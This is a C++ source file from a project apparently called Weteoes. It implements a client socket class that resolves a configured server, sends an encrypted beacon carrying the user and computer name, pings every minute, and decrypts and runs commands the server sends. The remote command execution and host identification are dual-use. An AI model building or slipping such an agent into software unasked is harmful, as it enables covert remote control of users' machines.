#ifndef ServerSocketClass_H
#define ServerSocketClass_H
#include <Weteoes/Loading.h>
#include <Weteoes/Model/Sockets/CSocket.h>

class ServerSocketClass : public CSocketClass
{
public:
	static ServerSocketClass use; // this Class

private:
	virtual void Loading(); // 初始化
	virtual SOCKADDR_IN Socket_Initialization(); // Initialization Socket
	virtual void Socket_RunShell(std::string); // 运行命令
	virtual void Send_Socket_While(SOCKET); // 循环发送Socket
	virtual std::string GetFirstSendData(); // 第一次发送的数据

private:
	std::string EncryptData(std::string); // 加密数据
};
#endif

#ifndef ServerSocketClass_CPP
#define ServerSocketClass_CPP
#include <Weteoes/Application/RSA.h>
#include <Weteoes/Application/Config.h>
#include <Weteoes/Application/Actions/Software.h>
#include <Weteoes/Dll/ManagementDll.h>
#include <Weteoes/Dll/ClientDll.h>

ServerSocketClass ServerSocketClass::use;

void ServerSocketClass::Loading() {
	socketCache = ConfigClass::Socket_Cache; // 缓存区大小
}
SOCKADDR_IN ServerSocketClass::Socket_Initialization() {
	SOCKADDR_IN server;
	memset(&server, 0, sizeof(SOCKADDR_IN)); //初始化(先将保存地址的server置为全0)
	std::string URL_Socket = ManagementDll::Get((char*)"URL_Socket");
	int Socket_Port = atoi(ManagementDll::Get((char*)"Socket_Port"));
	if (URL_Socket.empty() || Socket_Port <= 0) { return server; }
	server.sin_family = PF_INET; //声明地址格式是TCP/IP地址格式
	server.sin_port = htons(Socket_Port); //指明连接服务器的端口号
	/* 解析域名 */
getDomainIp:
	std::string ServerIp = GetIpByName(URL_Socket); //因为是域名要转换
	if (ServerIp == "") { Sleep(2000); goto getDomainIp; }
	inet_pton(AF_INET, ServerIp.c_str(), &server.sin_addr.S_un.S_addr);//字符串变成网路地址
	return server;
}
void ServerSocketClass::Socket_RunShell(std::string data) { //执行动作
	std::string re = RSAClass().B_PrivateUnEncode(data); //解密数据
	if (re == "") { return; } //解密失败
	if (re == ConfigClass::Socket_Error) { //如果是Error(密码错误)
		SocketStopFlac = true;
		SoftwareClass().RebootSoftware();
		return;
	}
	// 如果是Success
	else if (re == ConfigClass::Socket_OK) { return; }
	else { //是其他的话
		if (!ClientDll::Client_Entrance((char*)re.c_str())) { //执行，如果不是合法信息
			return;
		}
	}
}
void ServerSocketClass::Send_Socket_While(SOCKET socket) {
	while (1) {
		if (!Send_Socket(sClient, EncryptData(ConfigClass::Socket_Hello))) { // Error
			return;
		}
		else { ::Sleep(1000 * 60); }
	}
}
std::string ServerSocketClass::GetFirstSendData() {
	if (!ConfigDll().Loading()) { return ""; }
	ConfigDllStruct::UserConfig_ UserConfig = ConfigDll::Config_ReadUser();
	ConfigDllStruct::ComputerConfig_ ComputerConfig = ConfigDll::Config_ReadComputer();
	std::string b = "Weteoes_Server_";
	b += std::string(UserConfig.w) + "|" + std::string(ComputerConfig.ComputerName);
	return EncryptData(b);
}
std::string ServerSocketClass::EncryptData(std::string data) {
	return RSAClass().A_PublicEncode(data);
}
#endif